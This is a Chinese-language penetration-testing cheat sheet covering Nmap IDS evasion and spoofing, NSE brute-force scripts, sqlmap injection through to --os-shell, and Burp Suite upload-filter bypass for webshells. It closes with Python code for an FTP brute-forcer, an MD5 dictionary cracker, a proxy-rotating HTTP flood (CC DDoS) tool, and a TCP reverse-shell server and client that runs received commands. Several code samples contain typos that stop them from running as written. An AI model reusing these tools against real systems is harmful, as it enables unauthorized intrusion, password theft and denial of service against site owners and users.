[toc]
# NMAP高级嗅探
## (网络)防火墙逃逸嗅探
1. IDS（Intrusion Detection Systems）入侵检测系统
2. NMAP逃逸方案：
	1. 报文分段：``nmap -f [IP]`` //将TCP头分段在几个包中，使过滤器、IDS以及其他工具检测更加困难
	2. 指定最大传输单元（MTU,Maximum Transmission Unit）：``nmap --mtu [num] [IP]`` 设定TCP/IP协议传输数据时最大传输单元，有效实现逃逸 
	3. 隐蔽扫描：``nmap -D RND:[num] [IP]`` “-D”启动隐蔽扫描，让目标主机认为是利用诱饵进行扫描而非本机，实现隐藏自身IP。（应对方式：路由跟踪、响应丢弃等）
	4. 源地址欺骗：``nmap -sI [www.baidu.com:80] [IP]`` 伪造一个地址作为发起扫描的源地址
	5. 源端口欺骗：``nmap --source-port [num] [IP]``  指定一个随机端口，通过该端口发送数据
	6. MAC地址欺骗：``nmap -sT --spoof-mac [MAC] [IP]`` 
	7. 附加随机数据：``nmap --data-length [num] [IP]`` 参杂一些随机数据影响防火墙判断
## NSE 脚本
### 1. 信息收集脚本
1. IP信息：``nmap --script ip-geolocation-* [IP]``
2. Whois：``nmap --script whois [site]``
3. IP反查：``nmap --script hostmap-ip2hosts [site]``
### 2. 漏洞扫描脚本
1. windows系统主机漏洞扫描：``nmap --script smb-check-vulns.nse -p [IP]``
2. web漏洞扫描：``nmap -sV --script=vulscan/vulscan.nse [IP]`` Vulscan漏洞扫描高级脚本，包含CVE\OSVDB\Exploit-db\openvas多个平台指纹数据，具备离线扫描功能。（[脚本地址](http://www.computec.ch/projekte/vulscan/?s=download)存放于目录\nmap\scripts\下）
### 3. 渗透测试脚本
1. FTP服务审计：``nmap --script ftp-brute --script-args userdb=user.txt,passdb=pass.txt -p 21 [IP]`` 通过设定的字典对FTP爆破
2. Wordpress密码审计：``nmap -p80 --script http-wordpress-brute --script-args userdb=user.txt,passdb=passwd.txt [IP]`` // 可通过设定线程数量提高破解速度：`--script-args http-wordpress.threads=[num]`
3. 数据库安全审计：``nmap -p80 --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=username.txt,passdb=passwd.txt [IP]`` (MySQL操作一致)
# SQLMAP
## 基本操作
1. ``sqlmap -u URL --tables``
## 伪静态注入
1. 实质：使用了ASP一类的动态脚本实现
1. 存在漏洞位置加 “ * ”：``sqlmap -u URL/id/40*.html --dbs``
## Cookie注入
1. 产生来源：request方法，用户可从提交的参数中获取参数值
2. ``sqlmap -u "http://xxx.xxx.xxx/shownews.asp" --cookie "id=25" --tables --level 2``
	1. 将URL分段
	2. 使用``--cookie``进行连接
	3. 设置``--level``等级2级以上
## POST类型注入
1. 产生来源：（搜索框、登录框）对POST过滤不严
2. 操作步骤：
	1. 方法一：
		2. 获取表单信息进行分析：找出输入框对应参数变量
		3. 使用``--data``指定注入点：``sqlmap -u http://xxx/Login.asp --data "[Name]=1&[Password]=1"`` 
	2. 方法二：
		1. 使用``--forms``sqlmap自动获取相关信息，查看输出结果``Payload:``处：``sqlmap -u http://domain/Login.asp --forms``
## 防火墙逃逸
1. 方案一：``--delay 1``使用延迟方法逃逸
2. 方案二：``--tamper "xxx.py"``执行逃逸脚本（默认脚本位置：/usr/share/sqlmap/tamper/）
## 命令执行与维持访问
1. 产生来源：开发者配置问题，不限制数据库权限，注入点未添加权限限制
2. ``--os-cmd=xxx``
3. ``--os-shell``
# Burp Suite
## 基本操作：
### 1. proxy>>Intercept
1. forwar
2. drop：放弃当前数据
3. intercept is on/off：开关
4. Raw：请求地址、http协议版本、主机头、浏览器信息、cookie、网页内容等信息
5. Params：GET请求、POST请求、Cookie参数
6. Hex：显示Raw选项的16进制内容
### 2. 密码安全审计（Intruder）
1. Action >> Send to Intruder
2. Positions:
	1. Add$：选中内容设置为变量
	2. Clean$：重置变量
	3. Auto$：自动选取变量
	4. Refresh
	5. Attack type:
		1. Sniper：适合只有一个变量，每次填入一个参数进行审计
		2. Battering ram：用于两个及以上的变量，在一个字典文件中提取一个值覆盖多个变量进行审计
		3. Pitchfork：在两个字典文件中提取一对或一个值覆盖变量
		4. Cluster bomb：使用两个字典进行排列组合并进行审计
3. Payloads：设置payload模式，配置字典
4. start attack：观察len长度，进行筛选
### 3. 重放攻击
1. intruder 传递审计结果到 repeater ：重放发送，查看响应内容
2. proxy 上传数据（木马）传递到 repeater 进行数据欺骗：修改文件类型验证信息，进行重放攻击验证（当目标服务器配置了文件格式限制）
	<font color=green>
	1. 扩展名验证：``filename="xxx.php"``
	2. MINI类型验证：``Content-Type:``
	3. 文件头校验/文件完整性验证：插入真实的[图片文件]
	</font>
### 4. 响应比较
1. Comparer：自动高亮功能方便比较
### 5. Web漏洞脚本安全审计：Taget >> scan
### 6. cookie安全性随机分析：Sequencer
### 7. 编码解码器：Decoder
### 8. 第三方模块：Extender
# BeFF测试Xss漏洞
# Develop Penetration Tools
## 1. 简单的FTP破解程序样式（可优化，加入多线程提高性能等）
```python
from ftplib import FTP
def ftp_login(host,username,password)
	try:
		ftp=FTP()
		ftp.connect(host,21)
		ftp.login(username,password)
		ftp.quit()
		print("[+]Sucess Password:",password)
	except:
			pass
def ftp_try(host,username,password):
	for i in open(password):
		ftp_login(host,username,i.strip())
if __name__=='__main__':
	ftp_try('192.168.0.1','admin','/home/password.txt')
```
## 2. MD5破解程序（彩虹表碰撞、穷举法）
1. python提供了hashlib模块，对明文进行MD5加密
	```python
		import hshlib
		md5 = hashlib.md5()
		md5.update('Python'.encode('utf-8'))
		print(md5.hexidigest())
	```
2. 程序思路：取出字典中的明文，使用hashlib进行加密，加密结果与密文进行对比，一致打印明文，不一致则继续循环。
	1. hashlib加密明文
	2. datatime计算程序运行时间
	3. sys获取输入的密文
	``` python
		import hashlib
		import datetime
		import sys
		name=sys.argv[1]
		starttime=datetime.datetime.now()
		for i in open(r'C:/123.txt'):
			rs=i.strip()
			md5=hashlib.md5()
			md5.update(rs.encode('utf-8'))
			newmd5 = md5.hexdigest()
			if newmd5 == name:
				print("解密成功！明文是：",rs)
				break
			else:
				pass
			endtime = datetime.datetime.now()
			print(endtime-starttime)	  
	```
## 3. Web密码安全审计工具
## 4. ChallengeCallapsar压力测试（CC：WEB DDOS）
1. 原理：多线程模拟多合法用户，确保有大量可用的代理地址
2. 操作思路：
	1. 引入urllib、threading模块，将获取的代理地址以列表方式存储（代理地址可采取爬虫方式批量获取）
		``` python
		from urllib import request
		import threading
		url = "http://www.xxxx.com/"
		proxies=["114.xxx.xxx.xx:xxxx","xxx.xxx.xxx.xxx:xxxx","xxx.xxx.xxx:xxxx"]
		class cc(threading.Thread):
			def __init__(self,url,proxies):
				super(cc,self).__init__()
				self.url=url
				self.proxies=proxies
				self.start()
		```
	2. CC函数定义
		1. request.ProxyHandler()函数设置代理服务器
		2. build_opener()函数创建自定义Opener对象
		3. Install_opener()函数创建opener
		4. 可选择使用random.choice()随机选择代理地址，可呈现不规则方式，躲避目标防火墙
		```python
		# class cc(threading,Thread):
		def run(self):
			while True:
				try:
					pro_random = random.choice(self.proxies)
					pro_support = request.ProxyHandler({"http":pro_random})
					opener = request.build_opener(pro_support)
					request.install_opener(opener)
					request.urlopen(self.url)
				except:
						pass
		```
	3. 执行循环
		```python
		for i in range(5000):
			cc(url.proxies)
		```
## 5. 后渗透（维持访问）：TCP反向连接
1. 服务端：
	1. 导入socket模块
	2. 安装并绑定套接字，允许最大连接数100，超出则拒绝
	3. 通过一个while循环来接受并发送用户执行的命令
	4. 将结果接收回来并打印
	```python
	import socket
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.bind(('',1234))
	s.listen(100)
	conn,addr = s.accept()
	while 1:
		command = input('......>')
		if command == 'exit()':
			conn.send(command.encode('gbk'))
			break
		else:
			if command == '':
				continue
			conn,send(command.encode('gbk'))
			result = conn.recv(1024)
			print(result.decode('gbk','ignore'))
	s.close()
	```
3. 客户端
	1. 使用subprocess执行获得的用户命令
	```python
	import socket,subprocess as sp,sys,re
	conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	conn.connect(('127.0.0.1',1234))
	while 1:
		command = conn.renv(1024)
		if command == 'exit()':
			break
		else:
			sh = sp.Popen(command.decode('gbk'),shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE)
			out,err=sh.communicate()
			conn.send(out)
	conn.close()
	```
